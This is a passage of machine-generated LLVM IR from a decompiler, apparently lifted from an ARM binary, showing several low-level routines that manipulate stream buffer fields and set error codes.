dec_label_pc_139fc.dec_label_pc_13a10_crit_edge:  ; preds = %dec_label_pc_139fc
  %v0_13a10.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13a10

dec_label_pc_13a10:                               ; preds = %dec_label_pc_139f4.dec_label_pc_13a10_crit_edge, %dec_label_pc_139fc.dec_label_pc_13a10_crit_edge
  %v0_13a10 = phi i32 [ %v0_139f4, %dec_label_pc_139f4.dec_label_pc_13a10_crit_edge ], [ %v0_13a10.pre, %dec_label_pc_139fc.dec_label_pc_13a10_crit_edge ]
  store i32 %v0_13a10, i32* %r2.global-to-local, align 4
  %v0_13a14 = load i32, i32* @r5, align 4
  store i32 %v0_13a14, i32* %r0.global-to-local, align 4
  %v4_13a1c = call i32 @function_13cac(i32 %v0_13a14, i32* nonnull %stack_var_-28, i32 %v0_13a10)
  store i32 %v4_13a1c, i32* %r0.global-to-local, align 4
  %v1_13a20 = icmp slt i32 %v4_13a1c, 0
  br i1 %v1_13a20, label %dec_label_pc_13a64, label %dec_label_pc_13a28

dec_label_pc_13a28:                               ; preds = %dec_label_pc_13a10
  %v0_13a28 = load i32, i32* @r5, align 4
  %v1_13a28 = inttoptr i32 %v0_13a28 to i32*
  %v2_13a28 = load i32, i32* %v1_13a28, align 4
  store i32 %v2_13a28, i32* %r3.global-to-local, align 4
  %v1_13a2c = add i32 %v0_13a28, 8
  %v2_13a2c = inttoptr i32 %v1_13a2c to i32*
  %v3_13a2c = load i32, i32* %v2_13a2c, align 4
  store i32 %v3_13a2c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13a34 = and i32 %v2_13a28, -72
  store i32 %v1_13a34, i32* %r3.global-to-local, align 4
  %v3_13a38 = sdiv i32 %v2_13a28, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_13a40 = trunc i32 %v3_13a38 to i8
  %v3_13a40 = add i32 %v0_13a28, 1
  %v4_13a40 = inttoptr i32 %v3_13a40 to i8*
  store i8 %v1_13a40, i8* %v4_13a40, align 1
  %v0_13a44 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a44 = load i32, i32* @r5, align 4
  %v2_13a44 = add i32 %v1_13a44, 28
  %v3_13a44 = inttoptr i32 %v2_13a44 to i32*
  store i32 %v0_13a44, i32* %v3_13a44, align 4
  %v0_13a48 = load i32, i32* %r0.global-to-local, align 4
  %v1_13a48 = trunc i32 %v0_13a48 to i8
  %v2_13a48 = load i32, i32* @r5, align 4
  %v3_13a48 = add i32 %v2_13a48, 2
  %v4_13a48 = inttoptr i32 %v3_13a48 to i8*
  store i8 %v1_13a48, i8* %v4_13a48, align 1
  %v0_13a4c = load i32, i32* %r3.global-to-local, align 4
  %v1_13a4c = trunc i32 %v0_13a4c to i8
  %v2_13a4c = load i32, i32* @r5, align 4
  %v3_13a4c = inttoptr i32 %v2_13a4c to i8*
  store i8 %v1_13a4c, i8* %v3_13a4c, align 1
  %v0_13a50 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a50 = load i32, i32* @r5, align 4
  %v2_13a50 = add i32 %v1_13a50, 16
  %v3_13a50 = inttoptr i32 %v2_13a50 to i32*
  store i32 %v0_13a50, i32* %v3_13a50, align 4
  %v0_13a54 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a54 = load i32, i32* @r5, align 4
  %v2_13a54 = add i32 %v1_13a54, 20
  %v3_13a54 = inttoptr i32 %v2_13a54 to i32*
  store i32 %v0_13a54, i32* %v3_13a54, align 4
  %v0_13a58 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a58 = load i32, i32* @r5, align 4
  %v2_13a58 = add i32 %v1_13a58, 24
  %v3_13a58 = inttoptr i32 %v2_13a58 to i32*
  store i32 %v0_13a58, i32* %v3_13a58, align 4
  %v0_13a5c = load i32, i32* %r0.global-to-local, align 4
  %v1_13a5c = load i32, i32* @r5, align 4
  %v2_13a5c = add i32 %v1_13a5c, 44
  %v3_13a5c = inttoptr i32 %v2_13a5c to i32*
  store i32 %v0_13a5c, i32* %v3_13a5c, align 4
  br label %dec_label_pc_13a68

dec_label_pc_13a64:                               ; preds = %dec_label_pc_139e4, %dec_label_pc_13a10, %dec_label_pc_139fc
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13a68

dec_label_pc_13a68:                               ; preds = %dec_label_pc_13a28, %dec_label_pc_13a64
  %v0_13a68 = load i32, i32* %r7.global-to-local, align 4
  %v2_13a68 = icmp eq i32 %v0_13a68, 0
  br i1 %v2_13a68, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_13a68
  store i32 %v2_13974, i32* %r0.global-to-local, align 4
  store i32 68948, i32* %r3.global-to-local, align 4
  store i32 80512, i32* @lr, align 4
  call void @__pseudo_branch(i32 68948)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13a68, %dec_label_pc_13984, %bb
  %v0_13a80 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13a80, i32* %r0.global-to-local, align 4
  store i32 %v3_1396c, i32* @r4, align 4
  store i32 %v6_1396c, i32* @r5, align 4
  store i32 %v9_1396c, i32* @r6, align 4
  ret i32 %v0_13a80

; uselistorder directives
  uselistorder i32 %v0_13a10, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 11, 5, 12, 6, 9, 7, 8, 10 }
  uselistorder i32 ()* @function_10d4c, { 27, 36, 35, 34, 33, 32, 31, 30, 6, 37, 7, 5, 4, 3, 46, 45, 44, 43, 2, 0, 1, 26, 25, 24, 23, 22, 21, 20, 19, 29, 18, 17, 16, 15, 14, 42, 28, 13, 41, 47, 12, 11, 40, 39, 38, 10, 9, 8 }
  uselistorder i32 ptrtoint (i8* @global_var_10d4c.283 to i32), { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @function_10d54, { 25, 24, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 0, 1, 44, 43, 3, 2, 29, 28, 23, 22, 21, 20, 19, 18, 17, 16, 15, 52, 27, 26, 14, 51, 13, 12, 11, 10, 50, 49, 48, 47, 46, 45, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 68948, { 0, 5, 6, 7, 8, 1, 9, 10, 11, 2, 3, 4, 12, 13, 14, 15 }
  uselistorder i32 22, { 1, 11, 2, 3, 8, 10, 12, 4, 13, 0, 14, 5, 9, 6, 7 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13a68, { 1, 0 }
  uselistorder label %dec_label_pc_13a64, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13a10, { 1, 0 }
  uselistorder label %dec_label_pc_139d8, { 1, 0 }
}

define i32 @function_13a9c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13a9c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13a9c = load i32, i32* @r4, align 4
  store i32 %v3_13a9c, i32* %stack_var_-12, align 4
  %v3_13aa0 = load i8, i8* %arg1, align 1
  %v4_13aa0 = zext i8 %v3_13aa0 to i32
  store i32 %v4_13aa0, i32* %r3.global-to-local, align 4
  %v1_13aa4 = and i32 %v4_13aa0, 4
  store i32 %v1_13aa4, i32* %r5.global-to-local, align 4
  %v2_13aa4 = icmp eq i32 %v1_13aa4, 0
  store i1 %v2_13aa4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_13aa4, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_13a9c
  store i32 %v3_13a9c, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %dec_label_pc_13a9c
  %v1_13ab4 = icmp slt i32 %arg2, 0
  %v2_13ab4 = icmp eq i32 %arg2, 0
  store i1 %v2_13ab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_13ab4, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_13abc = add i32 %tmp, 4
  %v2_13abc = inttoptr i32 %v1_13abc to i32*
  %v3_13abc = load i32, i32* %v2_13abc, align 4
  store i32 %v3_13abc, i32* %r0.global-to-local, align 4
  %v1_13ac0 = call i32 @function_14bf8(i32 %v3_13abc)
  store i32 %v1_13ac0, i32* %r0.global-to-local, align 4
  %v2_13ac4 = icmp eq i32 %v1_13ac0, 0
  store i1 %v2_13ac4, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_13ac0, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_13ac8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_13ac8, i32* @r4, align 4
  ret i32 %v1_13ac0

bb13:                                             ; preds = %bb10
  %v0_13acc = load i32, i32* @r4, align 4
  %v1_13acc = inttoptr i32 %v0_13acc to i32*
  %v2_13acc = load i32, i32* %v1_13acc, align 4
  %v1_13ad0 = or i32 %v2_13acc, 8
  store i32 %v1_13ad0, i32* %r1.global-to-local, align 4
  %v1_13ad4 = or i32 %v2_13acc, 4
  store i32 %v1_13ad4, i32* %r3.global-to-local, align 4
  %v3_13ad8 = sdiv i32 %v2_13acc, 256
  store i32 %v3_13ad8, i32* @ip, align 4
  br i1 %v2_13ac4, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_13ae0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_13ae0, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_13ae4 = trunc i32 %v3_13ad8 to i8
  %v4_13ae4 = add i32 %v0_13acc, 1
  %v5_13ae4 = inttoptr i32 %v4_13ae4 to i8*
  store i8 %v2_13ae4, i8* %v5_13ae4, align 1
  %v0_13ae8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13ae8.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_13ae8 = load i32, i32* %r3.global-to-local, align 4
  %v2_13ae8 = trunc i32 %v1_13ae8 to i8
  %v3_13ae8 = load i32, i32* @r4, align 4
  %v4_13ae8 = inttoptr i32 %v3_13ae8 to i8*
  store i8 %v2_13ae8, i8* %v4_13ae8, align 1
  %v0_13aec.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13aec.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_13aec = load i32, i32* @ip, align 4
  %v2_13aec = trunc i32 %v1_13aec to i8
  %v3_13aec = load i32, i32* @r4, align 4
  %v4_13aec = add i32 %v3_13aec, 1
  %v5_13aec = inttoptr i32 %v4_13aec to i8*
  store i8 %v2_13aec, i8* %v5_13aec, align 1
  %v0_13af0.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13af0.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_13af0 = load i32, i32* %r1.global-to-local, align 4
  %v2_13af0 = trunc i32 %v1_13af0 to i8
  %v3_13af0 = load i32, i32* @r4, align 4
  %v4_13af0 = inttoptr i32 %v3_13af0 to i8*
  store i8 %v2_13af0, i8* %v4_13af0, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_13af4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13af4, i32* @r4, align 4
  %v11_13af4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_13af4

; uselistorder directives
  uselistorder i32 %v3_13ad8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @function_13af8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13af8:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_13af8 = load i32, i32* @r4, align 4
  store i32 %v3_13af8, i32* %stack_var_-16, align 4
  %v2_13afc = add i32 %tmp, 1
  %v3_13afc = inttoptr i32 %v2_13afc to i8*
  %v4_13afc = load i8, i8* %v3_13afc, align 1
  %v5_13afc = zext i8 %v4_13afc to i32
  %v3_13b00 = load i8, i8* %arg1, align 1
  %v4_13b00 = zext i8 %v3_13b00 to i32
  store i32 %v4_13b00, i32* %r2.global-to-local, align 4
  %v4_13b04 = mul nuw nsw i32 %v5_13afc, 256
  %v5_13b04 = or i32 %v4_13b00, %v4_13b04
  store i32 %v5_13b04, i32* @lr, align 4
  %tmp15 = urem i8 %v3_13b00, 4
  %v2_13b08 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_13b08, label %bb, label %dec_label_pc_13b18

bb:                                               ; preds = %dec_label_pc_13af8
  store i32 0, i32* @ip, align 4
  br label %.thread

dec_label_pc_13b18:                               ; preds = %dec_label_pc_13af8
  %v1_13b08 = zext i8 %tmp15 to i32
  %v1_13b18 = add nsw i32 %v1_13b08, -1
  store i32 %v1_13b18, i32* @ip, align 4
  %v7_13b18 = icmp eq i8 %tmp15, 1
  br i1 %v7_13b18, label %.thread, label %dec_label_pc_13b20

dec_label_pc_13b20:                               ; preds = %dec_label_pc_13b18
  %v1_13b20 = and i32 %v4_13b04, 2048
  %v2_13b20 = icmp eq i32 %v1_13b20, 0
  br i1 %v2_13b20, label %.thread, label %dec_label_pc_13b28

dec_label_pc_13b28:                               ; preds = %dec_label_pc_13b20
  %v8_13b2c = icmp sgt i32 %v1_13b18, 1
  br i1 %v8_13b2c, label %dec_label_pc_13bb8, label %dec_label_pc_13b30

dec_label_pc_13b30:                               ; preds = %dec_label_pc_13b28
  %v2_13b30 = add i32 %tmp, 40
  %v3_13b30 = inttoptr i32 %v2_13b30 to i32*
  %v4_13b30 = load i32, i32* %v3_13b30, align 4
  %v2_13b34 = icmp eq i32 %v4_13b30, 0
  br i1 %v2_13b34, label %dec_label_pc_13b3c, label %dec_label_pc_13bb8

dec_label_pc_13b3c:                               ; preds = %dec_label_pc_13b30
  %v2_13b3c = add i32 %tmp, 3
  %v3_13b3c = inttoptr i32 %v2_13b3c to i8*
  %v4_13b3c = load i8, i8* %v3_13b3c, align 1
  %v5_13b3c = zext i8 %v4_13b3c to i32
  %v2_13b40 = add i32 %tmp, 44
  %v3_13b40 = inttoptr i32 %v2_13b40 to i32*
  %v4_13b40 = load i32, i32* %v3_13b40, align 4
  store i32 %v4_13b40, i32* %r2.global-to-local, align 4
  %v2_13b44 = sub nsw i32 %v1_13b18, %v5_13b3c
  %v1_13b4c = add nsw i32 %v2_13b44, -1
  store i32 %v1_13b4c, i32* @ip, align 4
  %tmp11 = icmp slt i32 %v4_13b40, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_13b3c
  %v7_13b50 = add i32 %tmp, 2
  %v8_13b50 = inttoptr i32 %v7_13b50 to i8*
  %v9_13b50 = load i8, i8* %v8_13b50, align 1
  %v10_13b50 = zext i8 %v9_13b50 to i32
  %v7_13b54 = sub nsw i32 %v1_13b4c, %v10_13b50
  store i32 %v7_13b54, i32* @ip, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13b3c, %bb, %dec_label_pc_13b20, %dec_label_pc_13b18, %bb12
  %v0_13b70 = phi i32 [ %v1_13b18, %dec_label_pc_13b20 ], [ %v1_13b18, %dec_label_pc_13b18 ], [ 0, %bb ], [ %v7_13b54, %bb12 ], [ %v1_13b4c, %dec_label_pc_13b3c ]
  %v1_13b58 = and i32 %v4_13b00, 64
  %v2_13b58 = icmp eq i32 %v1_13b58, 0
  %storemerge.in.in.v = select i1 %v2_13b58, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_13b64 = add i32 %tmp, 16
  %v3_13b64 = inttoptr i32 %v2_13b64 to i32*
  %v4_13b64 = load i32, i32* %v3_13b64, align 4
  %v2_13b68 = sub i32 %storemerge, %v4_13b64
  %v1_13b6c = inttoptr i32 %arg2 to i32*
  %v2_13b6c = load i32, i32* %v1_13b6c, align 4
  store i32 %v2_13b6c, i32* %r1.global-to-local, align 4
  %v3_13b6c = add i32 %arg2, 4
  %v4_13b6c = inttoptr i32 %v3_13b6c to i32*
  %v5_13b6c = load i32, i32* %v4_13b6c, align 4
  store i32 %v5_13b6c, i32* %r2.global-to-local, align 4
  %v2_13b70 = add i32 %v2_13b68, %v0_13b70
  store i32 %v2_13b70, i32* %r5.global-to-local, align 4
  %v2_13b74 = sub i32 %v2_13b6c, %v2_13b70
  %v2_13b78 = and i32 %v2_13b70, 1073741824
  %v3_13b78 = icmp ne i32 %v2_13b78, 0
  %v6_13b78 = icmp eq i1 %v3_13b78, false
  %tmp16 = icmp slt i32 %v2_13b70, 0
  %v4_13b78.neg = zext i1 %tmp16 to i32
  %v7_13b78 = add i32 %v5_13b6c, %v4_13b78.neg
  %v9_13b78 = sext i1 %v6_13b78 to i32
  %v10_13b78 = add i32 %v7_13b78, %v9_13b78
  store i32 %v10_13b78, i32* %r4.global-to-local, align 4
  store i32 %v2_13b74, i32* %v1_13b6c, align 4
  %v5_13b7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13b7c, i32* %v4_13b6c, align 4
  %v0_13b80 = load i32, i32* %r6.global-to-local, align 4
  %v1_13b80 = add i32 %v0_13b80, 4
  %v2_13b80 = inttoptr i32 %v1_13b80 to i32*
  %v3_13b80 = load i32, i32* %v2_13b80, align 4
  %v1_13b84 = load i32, i32* %r2.global-to-local, align 4
  %v8_13b88 = icmp sgt i32 %v3_13b80, %v1_13b84
  br i1 %v8_13b88, label %dec_label_pc_13b9c, label %dec_label_pc_13b8c

dec_label_pc_13b8c:                               ; preds = %.thread
  %v9_13b84 = icmp eq i32 %v3_13b80, %v1_13b84
  br i1 %v9_13b84, label %dec_label_pc_13b90, label %dec_label_pc_13ba0thread-pre-split

dec_label_pc_13b90:                               ; preds = %dec_label_pc_13b8c
  %v1_13b90 = inttoptr i32 %v0_13b80 to i32*
  %v2_13b90 = load i32, i32* %v1_13b90, align 4
  %v1_13b94 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_13b90, %v1_13b94
  br i1 %tmp17, label %dec_label_pc_13b9c, label %dec_label_pc_13ba0thread-pre-split

dec_label_pc_13b9c:                               ; preds = %dec_label_pc_13b90, %.thread
  %v0_13b9c = load i32, i32* %r5.global-to-local, align 4
  %v1_13b9c = sub i32 0, %v0_13b9c
  store i32 %v1_13b9c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13ba0

dec_label_pc_13ba0thread-pre-split:               ; preds = %dec_label_pc_13b90, %dec_label_pc_13b8c
  %v0_13ba0.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13ba0

dec_label_pc_13ba0:                               ; preds = %dec_label_pc_13ba0thread-pre-split, %dec_label_pc_13b9c
  %v0_13ba0 = phi i32 [ %v0_13ba0.pr, %dec_label_pc_13ba0thread-pre-split ], [ %v1_13b9c, %dec_label_pc_13b9c ]
  %v1_13ba0 = icmp slt i32 %v0_13ba0, 0
  br i1 %v1_13ba0, label %dec_label_pc_13ba8, label %dec_label_pc_13bbc

dec_label_pc_13ba8:                               ; preds = %dec_label_pc_13ba0
  %v0_13ba8 = call i32 @function_cec4()
  %v2_13bb0 = inttoptr i32 %v0_13ba8 to i32*
  store i32 75, i32* %v2_13bb0, align 4
  %v0_13bbc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13bbc

dec_label_pc_13bb8:                               ; preds = %dec_label_pc_13b30, %dec_label_pc_13b28
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13bbc

dec_label_pc_13bbc:                               ; preds = %dec_label_pc_13ba0, %dec_label_pc_13ba8, %dec_label_pc_13bb8
  %v0_13bbc = phi i32 [ %v0_13ba0, %dec_label_pc_13ba0 ], [ %v0_13bbc.pre, %dec_label_pc_13ba8 ], [ -1, %dec_label_pc_13bb8 ]
  %v2_13bc0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13bc0, i32* @r4, align 4
  ret i32 %v0_13bbc

; uselistorder directives
  uselistorder i32 %v1_13b84, { 1, 0 }
  uselistorder i32 %v3_13b80, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_13b00, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_13bbc, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @function_13bc4(i32 %arg1) local_unnamed_addr {
dec_label_pc_13bc4:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13bc4 = load i32, i32* @r4, align 4
  store i32 %v3_13bc4, i32* %stack_var_-8, align 4
  %v1_13bc8 = add i32 %arg1, 8
  %v1_13bcc = inttoptr i32 %v1_13bc8 to i32*
  %v2_13bcc = load i32, i32* %v1_13bcc, align 4
  store i32 %v2_13bcc, i32* @r1, align 4
  %v3_13bcc = add i32 %arg1, 12
  %v4_13bcc = inttoptr i32 %v3_13bcc to i32*
  %v5_13bcc = load i32, i32* %v4_13bcc, align 4
  %v2_13bd0 = sub i32 %v5_13bcc, %v2_13bcc
  store i32 %v2_13bd0, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_13bd8 = inttoptr i32 %arg1 to i8*
  %v4_13bd8 = call i32 @function_13a9c(i8* %v3_13bd8, i32 %v2_13bcc, i32 %v2_13bd0)
  %v0_13bdc = load i32, i32* @r4, align 4
  %v1_13bdc = add i32 %v0_13bdc, 8
  %v2_13bdc = inttoptr i32 %v1_13bdc to i32*
  %v3_13bdc = load i32, i32* %v2_13bdc, align 4
  store i32 %v3_13bdc, i32* %r2.global-to-local, align 4
  %v2_13be0 = add i32 %v3_13bdc, %v4_13bd8
  %v2_13be4 = add i32 %v0_13bdc, 20
  %v3_13be4 = inttoptr i32 %v2_13be4 to i32*
  store i32 %v2_13be0, i32* %v3_13be4, align 4
  %v0_13be8 = load i32, i32* %r2.global-to-local, align 4
  %v1_13be8 = load i32, i32* @r4, align 4
  %v2_13be8 = add i32 %v1_13be8, 16
  %v3_13be8 = inttoptr i32 %v2_13be8 to i32*
  store i32 %v0_13be8, i32* %v3_13be8, align 4
  %v2_13bec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13bec, i32* @r4, align 4
  ret i32 %v4_13bd8

; uselistorder directives
  uselistorder i32 %v4_13bd8, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @function_13bf0() local_unnamed_addr {
dec_label_pc_13bf0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13bf0 = load i32, i32* @r4, align 4
  store i32 %v3_13bf0, i32* %stack_var_-12, align 4
  %v0_13bf4 = load i32, i32* @r0, align 4
  %v1_13bf4 = inttoptr i32 %v0_13bf4 to i8*
  %v2_13bf4 = load i8, i8* %v1_13bf4, align 1
  %v3_13bf4 = zext i8 %v2_13bf4 to i32
  store i32 %v3_13bf4, i32* %r2.global-to-local, align 4
  %v1_13bf8 = add i32 %v0_13bf4, 1
  %v2_13bf8 = inttoptr i32 %v1_13bf8 to i8*
  %v3_13bf8 = load i8, i8* %v2_13bf8, align 1
  %v4_13bf8 = zext i8 %v3_13bf8 to i32
  store i32 %v4_13bf8, i32* %r3.global-to-local, align 4
  %v4_13bfc = mul nuw nsw i32 %v4_13bf8, 256
  %v5_13bfc = or i32 %v4_13bfc, %v3_13bf4
  store i32 %v5_13bfc, i32* %r2.global-to-local, align 4
  %v1_13c00 = load i32, i32* @r1, align 4
  %v2_13c00 = and i32 %v1_13c00, %v5_13bfc
  %v4_13c00 = icmp eq i32 %v2_13c00, 0
  store i32 %v0_13bf4, i32* @r4, align 4
  br i1 %v4_13c00, label %dec_label_pc_13c0c, label %dec_label_pc_13c24

dec_label_pc_13c0c:                               ; preds = %dec_label_pc_13bf0
  %v1_13c0c = and i32 %v5_13bfc, 2176
  %v2_13c0c = icmp eq i32 %v1_13c0c, 0
  br i1 %v2_13c0c, label %dec_label_pc_13c14, label %dec_label_pc_13c38

dec_label_pc_13c14:                               ; preds = %dec_label_pc_13c0c
  %v2_13c14 = or i32 %v1_13c00, %v5_13bfc
  store i32 %v2_13c14, i32* %r2.global-to-local, align 4
  %v3_13c18 = sdiv i32 %v2_13c14, 256
  store i32 %v3_13c18, i32* %r3.global-to-local, align 4
  %v1_13c1c = trunc i32 %v3_13c18 to i8
  store i8 %v1_13c1c, i8* %v2_13bf8, align 1
  %v0_13c20 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c20 = trunc i32 %v0_13c20 to i8
  %v2_13c20 = load i32, i32* @r0, align 4
  %v3_13c20 = inttoptr i32 %v2_13c20 to i8*
  store i8 %v1_13c20, i8* %v3_13c20, align 1
  %v0_13c24.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13c24

dec_label_pc_13c24:                               ; preds = %dec_label_pc_13bf0, %dec_label_pc_13c14
  %v0_13c24 = phi i32 [ %v0_13bf4, %dec_label_pc_13bf0 ], [ %v0_13c24.pre, %dec_label_pc_13c14 ]
  %v1_13c24 = inttoptr i32 %v0_13c24 to i8*
  %v2_13c24 = load i8, i8* %v1_13c24, align 1
  %v3_13c24 = zext i8 %v2_13c24 to i32
  store i32 %v3_13c24, i32* %r2.global-to-local, align 4
  %v1_13c28 = add i32 %v0_13c24, 1
  %v2_13c28 = inttoptr i32 %v1_13c28 to i8*
  %v3_13c28 = load i8, i8* %v2_13c28, align 1
  %v4_13c28 = zext i8 %v3_13c28 to i32
  %v4_13c2c = mul nuw nsw i32 %v4_13c28, 256
  %v5_13c2c = or i32 %v4_13c2c, %v3_13c24
  store i32 %v5_13c2c, i32* %r3.global-to-local, align 4
  %v1_13c30 = and i32 %v3_13c24, 16
  store i32 %v1_13c30, i32* %r5.global-to-local, align 4
  %v2_13c30 = icmp eq i32 %v1_13c30, 0
  br i1 %v2_13c30, label %dec_label_pc_13c60, label %dec_label_pc_13c38

dec_label_pc_13c38:                               ; preds = %dec_label_pc_13c0c, %dec_label_pc_13c24
  %v0_13c38 = call i32 @function_cec4()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_13c40 = inttoptr i32 %v0_13c38 to i32*
  store i32 9, i32* %v2_13c40, align 4
  br label %dec_label_pc_13c44

dec_label_pc_13c44:                               ; preds = %dec_label_pc_13c68, %dec_label_pc_13c38
  %v0_13c44 = load i32, i32* @r4, align 4
  %v1_13c44 = inttoptr i32 %v0_13c44 to i32*
  %v2_13c44 = load i32, i32* %v1_13c44, align 4
  %v1_13c48 = or i32 %v2_13c44, 8
  store i32 %v1_13c48, i32* %r3.global-to-local, align 4
  %v3_13c4c = sdiv i32 %v2_13c44, 256
  store i32 %v3_13c4c, i32* %r2.global-to-local, align 4
  %v1_13c54 = trunc i32 %v3_13c4c to i8
  %v3_13c54 = add i32 %v0_13c44, 1
  %v4_13c54 = inttoptr i32 %v3_13c54 to i8*
  store i8 %v1_13c54, i8* %v4_13c54, align 1
  %v0_13c58 = load i32, i32* %r3.global-to-local, align 4
  %v1_13c58 = trunc i32 %v0_13c58 to i8
  %v2_13c58 = load i32, i32* @r4, align 4
  %v3_13c58 = inttoptr i32 %v2_13c58 to i8*
  store i8 %v1_13c58, i8* %v3_13c58, align 1
  %v2_13c5c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13c5c, i32* @r4, align 4
  ret i32 -1

dec_label_pc_13c60:                               ; preds = %dec_label_pc_13c24
  %v1_13c60 = and i32 %v3_13c24, 64
  %v2_13c60 = icmp eq i32 %v1_13c60, 0
  br i1 %v2_13c60, label %dec_label_pc_13c90, label %dec_label_pc_13c68

dec_label_pc_13c68:                               ; preds = %dec_label_pc_13c60
  %v0_13c68 = call i32 @function_d8c8()
